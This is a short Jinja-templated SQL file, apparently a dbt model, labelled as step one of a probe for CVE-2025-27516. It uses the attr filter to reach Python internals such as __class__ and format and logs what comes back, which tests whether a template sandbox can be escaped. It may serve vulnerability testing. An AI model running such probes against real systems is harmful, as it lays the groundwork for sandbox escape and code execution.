{# CVE-2025-27516 probe - step 1 #}
{% set test1 = ''|attr('__class__') %}
{{ log("ATTR1=" ~ (test1 | string), info=True) }}
{% set test2 = ''|attr('format') %}
{{ log("ATTR2=" ~ (test2 | string), info=True) }}
{% set test3 = ''|attr('__len__') %}
{{ log("ATTR3=" ~ (test3 | string), info=True) }}
SELECT 1 as id
